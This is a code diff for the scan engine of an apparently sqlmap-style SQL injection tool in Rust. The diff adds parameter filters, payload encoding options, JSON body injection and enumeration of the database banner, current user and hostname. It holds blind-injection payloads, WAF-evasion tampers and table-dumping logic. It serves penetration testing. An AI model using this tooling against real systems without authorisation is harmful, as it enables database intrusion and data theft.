@@ -1,7 +1,8 @@
 #![deny(unsafe_code)]
 
 use crate::{
-    detection::{baseline, confirmation},
+    detection::baseline,
+    error::InjektError,
     http::client::{HttpClient, RequestSpec},
     session::{
         scrubber::Scrubber,
@@ -21,9 +22,10 @@ use crate::{
             detector::OobDetector,
             payloads::{is_valid_oob_domain, new_token, oob_payloads_for},
         },
+        payload_opts::{PayloadOpts, build_final_payload, encode_with_safe_chars},
         request_tamper::{hpp_body_str, hpp_query_url, should_apply_chunked},
         stacked::{detector::StackedDetector, payloads::stacked_payloads_for},
-        tamper::{Tamper, apply_tampers, tamper_transformation_sets},
+        tamper::{Tamper, tamper_transformation_sets},
         time::{detector::TimeDetector, payloads::time_payload_for},
         union::{detector::UnionDetector, payloads::union_payloads_for},
     },
@@ -31,10 +33,139 @@ use crate::{
 use futures::StreamExt as _;
 use http::Method;
 use indicatif::{ProgressBar, ProgressStyle};
-use std::{sync::Arc, time::Instant};
+use std::{collections::HashMap, io::IsTerminal as _, sync::Arc, time::Instant};
 use tokio::sync::RwLock;
 use tokio_util::sync::CancellationToken;
 use tracing::{info, warn};
+
+/// Spinner hidden when stderr is not a TTY (MCP stdio, pipes, CI).
+/// `indicatif` writes to stderr, so stdout JSON-RPC stays clean, but hidden
+/// avoids spam + steady-tick CPU in agent mode.
+fn spinner(msg: &str) -> ProgressBar {
+    if !std::io::stderr().is_terminal() {
+        return ProgressBar::hidden();
+    }
+    let pb = ProgressBar::new_spinner();
+    pb.set_style(
+        ProgressStyle::default_spinner()
+            .template("{spinner} {msg}")
+            .unwrap_or_else(|_| ProgressStyle::default_spinner()),
+    );
+    pb.set_message(msg.to_owned());
+    pb.enable_steady_tick(std::time::Duration::from_millis(80));
+    pb
+}
+
+fn progress_bar(len: u64) -> ProgressBar {
+    if !std::io::stderr().is_terminal() {
+        return ProgressBar::hidden();
+    }
+    let pb = ProgressBar::new(len);
+    pb.set_style(
+        ProgressStyle::default_bar()
+            .template("{bar:40} {pos}/{len} {msg}")
+            .unwrap_or_else(|_| ProgressStyle::default_bar()),
+    );
+    pb
+}
+
+/// Filter testable parameters by `-p` selection (case-insensitive).
+/// Accepts bare names (`id`), `location:name` (`body:user`,
+/// `cookie:PHPSESSID`, `header:X-Forwarded-For`) or full keys (`id@query`).
+/// Empty filter returns all params. Marker synthetics are always preserved
+/// when markers are present.
+#[must_use]
+pub fn filter_params(params: Vec<TargetParameter>, filter: &[String]) -> Vec<TargetParameter> {
+    if filter.is_empty() {
+        return params;
+    }
+    let lowered: Vec<String> = filter
+        .iter()
+        .map(|s| s.trim().to_ascii_lowercase())
+        .filter(|s| !s.is_empty())
+        .collect();
+    if lowered.is_empty() {
+        return params;
+    }
+    params
+        .into_iter()
+        .filter(|p| {
+            if p.name.starts_with("marker_") {
+                return true;
+            }
+            let name_l = p.name.to_ascii_lowercase();
+            let key_l = p.key().to_ascii_lowercase();
+            lowered.iter().any(|f| {
+                // Bare name (`id`) or full key (`id@query`, `x@header:y`).
+                if f == &name_l || f == &key_l {
+                    return true;
+                }
+                // `location:name` form (e.g. `body:user`, `cookie:PHPSESSID`).
+                let Some((loc, n)) = f.split_once(':') else {
+                    return false;
+                };
+                match &p.location {
+                    ParameterLocation::Header(h) => {
+                        // `header:X-Forwarded-For` matches header params by
+                        // header name; full `header:h` display also accepted.
+                        loc == "header" && (name_l == n || h.to_ascii_lowercase() == n)
+                    }
+                    other => other.to_string().to_ascii_lowercase() == loc && name_l == n,
+                }
+            })
+        })
+        .collect()
+}
+
+/// Number of base payloads to try per technique for a tuning `--level`.
+/// L1 is the historical budget (byte-identical default), L2 doubles it,
+/// L3+ exhausts the whole list. Pure and unit-testable.
+#[must_use]
+pub fn payload_budget(level: u8, default_take: usize, total: usize) -> usize {
+    match level {
+        // 0 is unreachable via CLI (clap range 1..=5); treated as L1 defensively.
+        0 | 1 => default_take.min(total),
+        2 => (default_take * 2).min(total),
+        _ => total,
+    }
+}
+
+/// `--ignore-code`: a response status listed in `codes` is treated as a
+/// negative probe (never a finding). The baseline (including WAF detection)
+/// runs before this filter and is never ignored.
+#[must_use]
+pub fn is_ignored(status: u16, codes: &[u16]) -> bool {
+    codes.contains(&status)
+}
+
+/// Build a synthetic raw request from `--data` so body params are preserved
+/// through baseline + injection (same path as `--raw-file`).
+/// Uses [`sniff_kind`] from `target::structured` for robust content-type
+/// detection: checks `Content-Type` first, then falls back to body shape
+/// (`{` → JSON, `<` → XML, else → urlencoded).
+#[must_use]
+pub fn synthetic_raw_from_data(data: &str) -> Option<RawRequest> {
+    use crate::target::structured::sniff_kind;
+    let trimmed = data.trim();
+    if trimmed.is_empty() {
+        return None;
+    }
+    let kind = sniff_kind(None, trimmed);
+    let content_type = match kind {
+        crate::target::structured::StructuredKind::Json => "application/json",
+        crate::target::structured::StructuredKind::Xml => "application/xml",
+        _ => "application/x-www-form-urlencoded",
+    };
+    let mut headers = HashMap::new();
+    headers.insert("Content-Type".to_owned(), content_type.to_owned());
+    Some(RawRequest {
+        method: "POST".to_owned(),
+        path: "/".to_owned(),
+        headers,
+        body: Some(trimmed.to_owned()),
+        http_version: "HTTP/1.1".to_owned(),
+    })
+}
 
 #[derive(Debug, Clone, PartialEq, Eq)]
 #[non_exhaustive]
@@ -50,10 +181,20 @@ pub enum EngineState {
 
 #[derive(Debug, Clone)]
 #[non_exhaustive]
+// Mirrors independent CLI flags 1:1 (see `Cli`); a state-machine/enum refactor
+// would break the flat --flag command-line surface it's derived from.
+#[allow(clippy::struct_excessive_bools)]
 pub struct EngineConfig {
     pub threads: usize,
     pub techniques: Vec<String>,
+    pub test_params: Vec<String>,
+    pub post_data: Option<String>,
+    pub payload_opts: crate::techniques::payload_opts::PayloadOpts,
+    pub matcher: crate::detection::matcher::MatcherConfig,
     pub tampers: Vec<crate::techniques::tamper::Tamper>,
+    pub level: u8,
+    pub confirm: bool,
+    pub ignore_codes: Vec<u16>,
     pub oob_domain: Option<String>,
     pub oob_poll_url: Option<String>,
     pub oob_wait_secs: u64,
@@ -66,6 +207,10 @@ pub struct EngineConfig {
     pub tables: bool,
     pub columns: bool,
     pub dump: bool,
+    pub banner: bool,
+    pub current_user: bool,
+    pub current_db: bool,
+    pub hostname: bool,
     pub db: Option<String>,
     pub table: Option<String>,
     pub column: Option<String>,
@@ -117,7 +262,14 @@ impl Default for EngineConfig {
                 "error".to_owned(),
                 "union".to_owned(),
             ],
+            test_params: Vec::new(),
+            post_data: None,
+            payload_opts: crate::techniques::payload_opts::PayloadOpts::default(),
+            matcher: crate::detection::matcher::MatcherConfig::default(),
             tampers: Vec::new(),
+            level: 1,
+            confirm: false,
+            ignore_codes: Vec::new(),
             oob_domain: None,
             oob_poll_url: None,
             oob_wait_secs: 5,
@@ -130,6 +282,10 @@ impl Default for EngineConfig {
             tables: false,
             columns: false,
             dump: false,
+            banner: false,
+            current_user: false,
+            current_db: false,
+            hostname: false,
             db: None,
             table: None,
             column: None,
@@ -168,29 +324,39 @@ impl Engine {
         Arc::clone(&self.state)
     }
 
-    pub async fn run(&self, target_str: &str) -> anyhow::Result<EngineState> {
+    /// # Errors
+    /// Returns an error if the target URL fails to parse, or a network/detection
+    /// phase fails unrecoverably.
+    pub async fn run(&self, target_str: &str) -> crate::error::Result<EngineState> {
         self.run_internal(target_str, None).await
     }
 
+    /// # Errors
+    /// Returns an error if the candidate URL fails to parse, or a network/detection
+    /// phase fails unrecoverably.
     pub async fn run_candidate(
         &self,
         candidate: &crate::recon::ParameterCandidate,
-    ) -> anyhow::Result<EngineState> {
+    ) -> crate::error::Result<EngineState> {
         self.run_internal(candidate.url.as_str(), Some(candidate))
             .await
     }
 
+    // TODO(tech-debt): this is the main scan state machine (parse -> baseline ->
+    // detection -> fingerprint -> extraction); splitting it needs care to avoid
+    // regressions and isn't done blind. Tracked, not hidden.
+    #[allow(clippy::too_many_lines)]
     async fn run_internal(
         &self,
         target_str: &str,
         candidate: Option<&crate::recon::ParameterCandidate>,
-    ) -> anyhow::Result<EngineState> {
+    ) -> crate::error::Result<EngineState> {
         let mut current = EngineState::Parse;
         info!(target=%self.scrubber.scrub(target_str), state=?current, "engine start");
 
         // Parse
         let target = TargetUrl::parse(target_str, self.config.allow_private)
-            .map_err(|e| anyhow::anyhow!("parse error: {e}"))?;
+            .map_err(|e| crate::error::InjektError::Other(Box::new(e)))?;
         current = EngineState::Baseline;
         info!(state=?current, "phase baseline");
 
@@ -198,18 +364,22 @@ impl Engine {
             return Ok(EngineState::Done);
         }
 
-        let raw_request = candidate.map(crate::recon::ParameterCandidate::raw_request);
+        let cli_raw_request = candidate.map(crate::recon::ParameterCandidate::raw_request);
         let candidate_param = candidate.map(crate::recon::ParameterCandidate::target_parameter);
+        // `--data` acts as a synthetic raw request (POST) so body params flow
+        // through baseline + injection like `--raw-file`. Real raw wins on conflict.
+        if cli_raw_request.is_some() && self.config.post_data.is_some() {
+            warn!("--raw-file and --data both set — raw request wins, --data ignored");
+        }
+        let raw_request: Option<RawRequest> = cli_raw_request.or_else(|| {
+            self.config
+                .post_data
+                .as_deref()
+                .and_then(synthetic_raw_from_data)
+        });
 
-        // Baseline: 3-5 requests
-        let pb = ProgressBar::new_spinner();
-        pb.set_style(
-            ProgressStyle::default_spinner()
-                .template("{spinner} {msg}")
-                .unwrap_or_else(|_| ProgressStyle::default_spinner()),
-        );
-        pb.set_message("collecting baseline…");
-        pb.enable_steady_tick(std::time::Duration::from_millis(80));
+        // Baseline: 3-5 requests (hidden when stderr is not a TTY: MCP/CI).
+        let pb = spinner("collecting baseline…");
 
         let mut samples = Vec::new();
         for _ in 0..3 {
@@ -226,8 +396,8 @@ impl Engine {
             match resp {
                 Ok(r) => {
                     let status = r.status().as_u16();
-                    let body = match r.bytes().await {
-                        Ok(b) => b.to_vec(),
+                    let body = match self.client.read_body_with_timeout(r).await {
+                        Ok(b) => b,
                         Err(e) => {
                             warn!(error=%e, "baseline body read failed");
                             Vec::new()
@@ -248,10 +418,14 @@ impl Engine {
             if self.cancel.is_cancelled() {
                 return Ok(EngineState::Done);
             }
-            anyhow::bail!("baseline failed: no successful responses from target after 3 attempts");
+            return Err(crate::error::InjektError::Other(Box::new(
+                std::io::Error::other(
+                    "baseline failed: no successful responses from target after 3 attempts",
+                ),
+            )));
         }
         pb.finish_with_message("baseline done");
-        let baseline = baseline::Baseline::new(samples);
+        let baseline = baseline::Baseline::new(&samples);
         if baseline.is_waf_blocked() {
             warn!("possible WAF detected (repeated 403/406)");
         }
@@ -268,7 +442,7 @@ impl Engine {
         };
         if !effective_tampers.is_empty() {
             info!(
-                tampers=?effective_tampers.iter().map(|t| t.name()).collect::<Vec<_>>(),
+                tampers=?effective_tampers.iter().map(super::super::techniques::tamper::Tamper::name).collect::<Vec<_>>(),
                 "WAF tampers active"
             );
         }
@@ -306,20 +480,33 @@ impl Engine {
         }
         // Always include real query params even when markers present (fixes #6)
         params.extend(crate::target::parameters::collect_from_url_query(&target));
-        let to_test: Vec<TargetParameter> = if let Some(param) = candidate_param {
+        // Body params from --raw-file or --data (synthetic raw)
+        if let Some(raw) = raw_request.as_ref() {
+            params.extend(crate::target::parameters::collect_from_raw_request(raw));
+        }
+        let mut to_test: Vec<TargetParameter> = if let Some(param) = candidate_param.clone() {
             vec![param]
         } else if params.is_empty() {
             vec![TargetParameter::new("id", ParameterLocation::Query, "1")]
         } else {
             params
         };
+        // `-p` selection (candidate_param from recon always wins and skips the filter)
+        if candidate_param.is_none() && !self.config.test_params.is_empty() {
+            let before = to_test.len();
+            to_test = filter_params(to_test, &self.config.test_params);
+            if to_test.is_empty() {
+                warn!(
+                    filter=?self.config.test_params,
+                    before,
+                    "parameter filter matched 0 params — nothing to test"
+                );
+            } else {
+                info!(filter=?self.config.test_params, before, after=%to_test.len(), "parameter filter applied");
+            }
+        }
 
-        let pb2 = Arc::new(ProgressBar::new(to_test.len() as u64));
-        pb2.set_style(
-            ProgressStyle::default_bar()
-                .template("{bar:40} {pos}/{len} {msg}")
-                .unwrap_or_else(|_| ProgressStyle::default_bar()),
-        );
+        let pb2 = Arc::new(progress_bar(to_test.len() as u64));
 
         // Bounded concurrent testing per parameter (respects --threads)
         let concurrency = self.config.threads.clamp(1, 32);
@@ -367,6 +554,10 @@ impl Engine {
                             raw_request.as_ref().as_ref(),
                             &tampers,
                             opts,
+                            &config.payload_opts,
+                            &config.matcher,
+                            config.level,
+                            &config.ignore_codes,
                         )
                         .await;
                     }
@@ -382,6 +573,10 @@ impl Engine {
                             raw_request.as_ref().as_ref(),
                             &tampers,
                             opts,
+                            &config.payload_opts,
+                            &config.matcher,
+                            config.level,
+                            &config.ignore_codes,
                         )
                         .await;
                     }
@@ -398,6 +593,10 @@ impl Engine {
                             raw_request.as_ref().as_ref(),
                             &tampers,
                             opts,
+                            &config.payload_opts,
+                            &config.matcher,
+                            config.level,
+                            &config.ignore_codes,
                         )
                         .await;
                     }
@@ -414,6 +613,10 @@ impl Engine {
                             raw_request.as_ref().as_ref(),
                             &tampers,
                             opts,
+                            &config.payload_opts,
+                            &config.matcher,
+                            config.level,
+                            &config.ignore_codes,
                         )
                         .await;
                     }
@@ -434,6 +637,10 @@ impl Engine {
                             raw_request.as_ref().as_ref(),
                             &tampers,
                             opts,
+                            &config.payload_opts,
+                            &config.matcher,
+                            config.level,
+                            &config.ignore_codes,
                         )
                         .await;
                     }
@@ -450,6 +657,10 @@ impl Engine {
                             raw_request.as_ref().as_ref(),
                             &tampers,
                             opts,
+                            &config.payload_opts,
+                            &config.matcher,
+                            config.level,
+                            &config.ignore_codes,
                         )
                         .await;
                     }
@@ -466,6 +677,10 @@ impl Engine {
                             raw_request.as_ref().as_ref(),
                             &tampers,
                             opts,
+                            &config.payload_opts,
+                            &config.matcher,
+                            config.level,
+                            &config.ignore_codes,
                             config.oob_domain.clone(),
                             config.oob_poll_url.clone(),
                             config.oob_wait_secs,
@@ -487,7 +702,7 @@ impl Engine {
             let findings_snapshot = self.state.read().await.findings().to_vec();
             if let Some(kind) = crate::dbms::fingerprint::guess_from_findings(&findings_snapshot) {
                 let mut st = self.state.write().await;
-                st.fill_missing_dbms(kind.clone());
+                st.fill_missing_dbms(kind);
                 info!(dbms=%kind, "fingerprint guessed from findings");
             } else if !findings_snapshot.is_empty() {
                 // Try banner extraction from evidences
@@ -496,7 +711,7 @@ impl Engine {
                         crate::dbms::fingerprint::extract_banner_version(&f.evidence)
                     {
                         let mut st = self.state.write().await;
-                        st.fill_missing_dbms(kind.clone());
+                        st.fill_missing_dbms(kind);
                         info!(dbms=%kind, version=%ver, "fingerprint banner detected");
                         break;
                     }
@@ -547,6 +762,7 @@ impl Engine {
                 crate::dbms::fingerprint::guess_from_findings(&snap)
                     .unwrap_or(crate::dbms::DbmsKind::MySql)
             };
+            #[allow(clippy::match_same_arms)]
             let version_query = match dbms_kind {
                 crate::dbms::DbmsKind::MySql => "SELECT @@version",
                 crate::dbms::DbmsKind::Postgres => "SELECT version()",
@@ -574,6 +790,7 @@ impl Engine {
                 if cancel_clone.is_cancelled() {
                     break;
                 }
+                #[allow(clippy::match_same_arms)]
                 let base_payload = match dbms_kind {
                     crate::dbms::DbmsKind::MySql => {
                         format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
@@ -591,7 +808,11 @@ impl Engine {
                         format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                     }
                 };
-                let payload = apply_tampers(&base_payload, &effective_tampers);
+                let payload = build_final_payload(
+                    &base_payload,
+                    &effective_tampers,
+                    &self.config.payload_opts,
+                );
                 // Retry logic: require 2 probes, treat as true only if majority true
                 let mut true_count = 0usize;
                 for _ in 0..2 {
@@ -603,6 +824,7 @@ impl Engine {
                         &marker_set_clone,
                         raw_request_clone.as_ref(),
                         effective_opts,
+                        &self.config.payload_opts,
                     );
                     let start = Instant::now();
                     let resp = client_clone.send_with_retry(spec, &cancel_clone).await;
@@ -647,7 +869,7 @@ impl Engine {
             let engine = crate::extraction::engine::ExtractionEngine::new(
                 crate::extraction::engine::ExtractionConfig::default(),
             );
-            let dbms_for_closure = dbms_kind.clone();
+            let dbms_for_closure = dbms_kind;
             let version_query_owned = version_query.to_owned();
             let baseline_body2 = baseline_body.clone();
             let baseline_mean2 = baseline_mean;
@@ -661,6 +883,7 @@ impl Engine {
 
             let target_str_for_oracle = target_str_clone.clone();
             let tampers_for_oracle = effective_tampers.clone();
+            let popts_for_oracle = self.config.payload_opts.clone();
             let oracle = move |pos: usize, mid: u8| {
                 let client = client_for_oracle.clone();
                 let state = state_for_oracle.clone();
@@ -671,12 +894,14 @@ impl Engine {
                 let raw = raw_for_oracle.clone();
                 let baseline_body = baseline_body2.clone();
                 let version_query = version_query_owned.clone();
-                let dbms_kind = dbms_for_closure.clone();
+                let dbms_kind = dbms_for_closure;
                 let target_str = target_str_for_oracle.clone();
                 let tampers = tampers_for_oracle.clone();
+                let popts = popts_for_oracle.clone();
                 let opts = effective_opts;
                 async move {
                     // build ASCII(SUBSTRING) >= mid payload
+                    #[allow(clippy::match_same_arms)]
                     let base = match dbms_kind {
                         crate::dbms::DbmsKind::MySql => format!(
                             "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
@@ -704,7 +929,7 @@ impl Engine {
                             mid
                         ),
                     };
-                    let payload = apply_tampers(&base, &tampers);
+                    let payload = build_final_payload(&base, &tampers, &popts);
                     // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling
                     let spec = build_injection_spec_with_raw(
                         &target,
@@ -714,6 +939,7 @@ impl Engine {
                         &marker_set,
                         raw.as_ref(),
                         opts,
+                        &popts,
                     );
                     let start = Instant::now();
                     let resp = client.send_with_retry(spec, &cancel).await;
@@ -731,11 +957,10 @@ impl Engine {
                         100.0,
                     );
                     // similar => true (>= mid)
-                    diff.confidence < 0.4
+                    Ok::<bool, InjektError>(diff.confidence < 0.4)
                 }
             };
-
-            let extracted = engine.extract(inferred_len, oracle).await;
+            let extracted = engine.extract(inferred_len, oracle).await?;
             let exposed = {
                 use secrecy::ExposeSecret;
                 extracted.expose_secret().to_owned()
@@ -745,12 +970,17 @@ impl Engine {
             self.state.write().await.push_extracted(extracted);
         }
 
-        // Enumeration phase (--dbs, --tables, --columns, --dump, --count)
+        // Enumeration phase (--dbs, --tables, --columns, --dump, --count,
+        // --banner, --current-user, --current-db, --hostname)
         let needs_enum = self.config.dbs
             || self.config.tables
             || self.config.columns
             || self.config.dump
-            || self.config.count;
+            || self.config.count
+            || self.config.banner
+            || self.config.current_user
+            || self.config.current_db
+            || self.config.hostname;
         let has_findings_for_enum = !self.state.read().await.findings().is_empty();
         if needs_enum && has_findings_for_enum {
             current = EngineState::Enumeration;
@@ -792,7 +1022,7 @@ impl Engine {
                     .unwrap_or(crate::dbms::DbmsKind::MySql)
             };
 
-            let detector = crate::dbms::fingerprint::get_detector(dbms_kind.clone());
+            let detector = crate::dbms::fingerprint::get_detector(dbms_kind);
 
             let baseline_body = baseline.representative_body_str();
             let baseline_mean = baseline.mean_ms;
@@ -823,8 +1053,12 @@ impl Engine {
                     raw_request_for_enum.as_ref(),
                     &effective_tampers,
                     effective_opts,
+                    &dbms_kind,
+                    &self.config.payload_opts,
+                    &self.config.matcher,
+                    &self.config.ignore_codes,
                 )
-                .await;
+                .await?;
                 if let Some(extracted) = extracted {
                     info!(extracted=%Scrubber::hash_truncated(&extracted), "databases enumerated");
                     self.state
@@ -852,8 +1086,12 @@ impl Engine {
                     raw_request_for_enum.as_ref(),
                     &effective_tampers,
                     effective_opts,
+                    &dbms_kind,
+                    &self.config.payload_opts,
+                    &self.config.matcher,
+                    &self.config.ignore_codes,
                 )
-                .await;
+                .await?;
                 if let Some(extracted) = extracted {
                     info!(extracted=%Scrubber::hash_truncated(&extracted), "tables enumerated for db={}", target_db);
                     self.state
@@ -881,8 +1119,12 @@ impl Engine {
                     raw_request_for_enum.as_ref(),
                     &effective_tampers,
                     effective_opts,
+                    &dbms_kind,
+                    &self.config.payload_opts,
+                    &self.config.matcher,
+                    &self.config.ignore_codes,
                 )
-                .await;
+                .await?;
                 if let Some(extracted) = extracted {
                     info!(extracted=%Scrubber::hash_truncated(&extracted), "columns enumerated for {}.{}", target_db, target_table);
                     self.state
@@ -916,8 +1158,12 @@ impl Engine {
                     raw_request_for_enum.as_ref(),
                     &effective_tampers,
                     effective_opts,
+                    &dbms_kind,
+                    &self.config.payload_opts,
+                    &self.config.matcher,
+                    &self.config.ignore_codes,
                 )
-                .await;
+                .await?;
                 if let Some(extracted) = extracted {
                     info!(extracted=%Scrubber::hash_truncated(&extracted), "dump extracted for {}.{} rows {}-{}", target_db, target_table, start, stop);
                     self.state
@@ -944,10 +1190,61 @@ impl Engine {
                     raw_request_for_enum.as_ref(),
                     &effective_tampers,
                     effective_opts,
+                    &dbms_kind,
+                    &self.config.payload_opts,
+                    &self.config.matcher,
+                    &self.config.ignore_codes,
                 )
-                .await;
+                .await?;
                 if let Some(extracted) = extracted {
                     info!(extracted=%Scrubber::hash_truncated(&extracted), "row count for {}.{}", target_db, target_table);
+                    self.state
+                        .write()
+                        .await
+                        .push_extracted(secrecy::SecretString::from(extracted));
+                }
+            }
+
+            for (flag, query, label) in [
+                (self.config.banner, detector.banner_query(), "banner"),
+                (
+                    self.config.current_user,
+                    detector.current_user_query(),
+                    "current_user",
+                ),
+                (
+                    self.config.current_db,
+                    detector.current_db_query(),
+                    "current_db",
+                ),
+                (self.config.hostname, detector.hostname_query(), "hostname"),
+            ] {
+                if !flag {
+                    continue;
+                }
+                let extracted = extract_enum_field(
+                    &client,
+                    &state,
+                    &cancel,
+                    &target_for_extract,
+                    &target_str,
+                    &first_param,
+                    &marker_set,
+                    &baseline_body,
+                    baseline_mean,
+                    query.clone(),
+                    label.to_owned(),
+                    raw_request_for_enum.as_ref(),
+                    &effective_tampers,
+                    effective_opts,
+                    &dbms_kind,
+                    &self.config.payload_opts,
+                    &self.config.matcher,
+                    &self.config.ignore_codes,
+                )
+                .await?;
+                if let Some(extracted) = extracted {
+                    info!(extracted=%Scrubber::hash_truncated(&extracted), label=%label, "identity enumerated");
                     self.state
                         .write()
                         .await
@@ -959,7 +1256,8 @@ impl Engine {
         }
 
         current = EngineState::Done;
-        info!(state=?current, requests=self.state.read().await.request_count(), "engine done");
+        let requests = self.state.read().await.request_count();
+        info!(state=?current, requests, "engine done");
         Ok(current)
     }
 
@@ -977,8 +1275,8 @@ impl Engine {
                 break;
             }
             // craft urls with payloads
-            let true_url = inject_param(target, param, &p.true_payload);
-            let false_url = inject_param(target, param, &p.false_payload);
+            let true_url = inject_param(target, param, &p.true_payload, &[], false);
+            let false_url = inject_param(target, param, &p.false_payload, &[], false);
 
             let (true_body, true_ms) =
                 fetch_body_and_time(&self.client, &true_url, &self.state).await;
@@ -1021,7 +1319,7 @@ impl Engine {
             if self.cancel.is_cancelled() {
                 break;
             }
-            let url = inject_param(target, param, &p.payload);
+            let url = inject_param(target, param, &p.payload, &[], false);
             let (body, _ms) = fetch_body_and_time(&self.client, &url, &self.state).await;
             let r = detector.evaluate(&body);
             if r.is_vulnerable {
@@ -1047,10 +1345,12 @@ impl Engine {
         baseline: &baseline::Baseline,
     ) {
         let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
-        let payload = time_payload_for(None, 3.0);
-        let url = inject_param(target, param, &payload.payload);
+        let payload = time_payload_for(None, 3);
+        let url = inject_param(target, param, &payload.payload, &[], false);
         let (_body, ms) = fetch_body_and_time(&self.client, &url, &self.state).await;
-        let r = detector.evaluate(ms, payload.sleep_secs);
+        // sleep_secs is a small time-based delay (seconds); cast is always lossless.
+        #[allow(clippy::cast_precision_loss)]
+        let r = detector.evaluate(ms, payload.sleep_secs as f64);
         if r.is_vulnerable {
             let finding = Finding::new(
                 target.as_str(),
@@ -1068,7 +1368,13 @@ impl Engine {
     }
 }
 
-fn inject_param(target: &TargetUrl, param: &TargetParameter, payload: &str) -> String {
+fn inject_param(
+    target: &TargetUrl,
+    param: &TargetParameter,
+    payload: &str,
+    safe: &[char],
+    skip_urlencode: bool,
+) -> String {
     // naive: replace query param value
     let mut url = target.inner().clone();
     let mut pairs: Vec<(String, String)> = url
@@ -1078,17 +1384,32 @@ fn inject_param(target: &TargetUrl, param: &TargetParameter, payload: &str) -> S
     let mut found = false;
     for (k, v) in &mut pairs {
         if k == &param.name {
-            *v = payload.to_owned();
+            payload.clone_into(v);
             found = true;
         }
     }
     if !found {
         pairs.push((param.name.clone(), payload.to_owned()));
     }
-    url.query_pairs_mut().clear();
-    for (k, v) in pairs {
-        url.query_pairs_mut().append_pair(&k, &v);
+    // Default path (no --safe-chars/--skip-urlencode): standard encoding,
+    // byte-identical to the historical behaviour.
+    if safe.is_empty() && !skip_urlencode {
+        url.query_pairs_mut().clear();
+        for (k, v) in pairs {
+            url.query_pairs_mut().append_pair(&k, &v);
+        }
+        return url.to_string();
     }
+    // Custom encoding: keys stay standard, values honour safe/skip.
+    let query = pairs
+        .iter()
+        .map(|(k, v)| {
+            let ek: String = url::form_urlencoded::byte_serialize(k.as_bytes()).collect();
+            format!("{ek}={}", encode_with_safe_chars(v, safe, skip_urlencode))
+        })
+        .collect::<Vec<_>>()
+        .join("&");
+    url.set_query(Some(&query));
     url.to_string()
 }
 
@@ -1099,7 +1420,7 @@ fn inject_with_marker(target_str: &str, payload: &str, marker_set: &MarkerSet) -
         if s.contains('*') {
             // Replace only first occurrence to avoid over-broad replacement
             if let Some(pos) = s.find('*') {
-                s.replace_range(pos..pos + 1, payload);
+                s.replace_range(pos..=pos, payload);
                 return s;
             }
         } else {
@@ -1149,20 +1470,63 @@ fn inject_param_or_marker(
     if marker_set.has_any() && param.name.starts_with("marker_") {
         inject_with_marker(target_str, payload, marker_set)
     } else {
-        inject_param(target, param, payload)
+        inject_param(target, param, payload, &[], false)
     }
 }
 
+#[allow(clippy::too_many_lines)]
 fn inject_body_param(
     raw: Option<&crate::target::raw_request::RawRequest>,
     param: &TargetParameter,
     payload: &str,
     hpp: bool,
+    safe: &[char],
+    skip_urlencode: bool,
 ) -> (Method, String, http::HeaderMap) {
     let method = raw
         .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
         .unwrap_or(Method::POST);
     let existing_body = raw.and_then(|r| r.body.as_deref());
+    // JSON bodies (`--data '{"a":1}'`): replace the key inside the object so
+    // blind payloads flow as valid JSON instead of urlencoded noise.
+    if let Some(body) = existing_body {
+        let trimmed = body.trim();
+        if trimmed.starts_with('{')
+            && trimmed.ends_with('}')
+            && let Ok(serde_json::Value::Object(mut obj)) =
+                serde_json::from_str::<serde_json::Value>(trimmed)
+        {
+            obj.insert(
+                param.name.clone(),
+                serde_json::Value::String(payload.to_owned()),
+            );
+            let json_body =
+                serde_json::to_string(&serde_json::Value::Object(obj)).unwrap_or_else(|_| {
+                    format!("{{\"{}\":\"{payload}\"}}", param.name.replace('"', "\\\""))
+                });
+            let mut headers = http::HeaderMap::new();
+            headers.insert(
+                http::header::CONTENT_TYPE,
+                http::HeaderValue::from_static("application/json"),
+            );
+            if let Some(r) = raw {
+                for (k, v) in &r.headers {
+                    if k.eq_ignore_ascii_case("content-type")
+                        || k.eq_ignore_ascii_case("content-length")
+                    {
+                        continue;
+                    }
+                    if let (Ok(name), Ok(val)) = (
+                        http::HeaderName::from_bytes(k.as_bytes()),
+                        http::HeaderValue::from_str(v),
+                    ) {
+                        headers.insert(name, val);
+                    }
+                }
+            }
+            return (method, json_body, headers);
+        }
+    }
     if hpp {
         // HPP: keep original fields, append param=payload as duplicate.
         let body_str = hpp_body_str(existing_body, &param.name, payload);
@@ -1196,16 +1560,29 @@ fn inject_body_param(
         let mut found = false;
         for (k, v) in &mut pairs {
             if k == &param.name {
-                *v = payload.to_owned();
+                payload.clone_into(v);
                 found = true;
             }
         }
         if !found {
             pairs.push((param.name.clone(), payload.to_owned()));
         }
-        url::form_urlencoded::Serializer::new(String::new())
-            .extend_pairs(pairs)
-            .finish()
+        // Default path: standard encoding. Custom path (--safe-chars/
+        // --skip-urlencode): keys stay standard, values honour safe/skip.
+        if safe.is_empty() && !skip_urlencode {
+            url::form_urlencoded::Serializer::new(String::new())
+                .extend_pairs(pairs)
+                .finish()
+        } else {
+            pairs
+                .iter()
+                .map(|(k, v)| {
+                    let ek: String = url::form_urlencoded::byte_serialize(k.as_bytes()).collect();
+                    format!("{ek}={}", encode_with_safe_chars(v, safe, skip_urlencode))
+                })
+                .collect::<Vec<_>>()
+                .join("&")
+        }
     } else {
         format!(
             "{}={}",
@@ -1256,6 +1633,8 @@ fn request_spec_from_raw(target: &TargetUrl, raw: &RawRequest) -> RequestSpec {
     spec
 }
 
+#[allow(clippy::too_many_arguments)]
+#[allow(clippy::too_many_lines)]
 fn build_injection_spec_with_raw(
     target: &TargetUrl,
     target_str: &str,
@@ -1264,7 +1643,12 @@ fn build_injection_spec_with_raw(
     marker_set: &MarkerSet,
     raw: Option<&crate::target::raw_request::RawRequest>,
     opts: ProbeOpts,
+    popts: &PayloadOpts,
 ) -> RequestSpec {
+    // Custom value encoding (--safe-chars/--skip-urlencode); collected once
+    // per injection (requests dominate the cost).
+    let safe: Vec<char> = popts.safe_chars.chars().collect();
+    let skip = popts.skip_urlencode;
     if marker_set.has_any() && param.name.starts_with("marker_") {
         let url = inject_with_marker(target_str, payload, marker_set);
         // Preserve method from raw request if available
@@ -1278,7 +1662,7 @@ fn build_injection_spec_with_raw(
             let url = if opts.hpp {
                 hpp_query_url(target.inner(), &param.name, payload)
             } else {
-                inject_param(target, param, payload)
+                inject_param(target, param, payload, &safe, skip)
             };
             let method = raw
                 .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
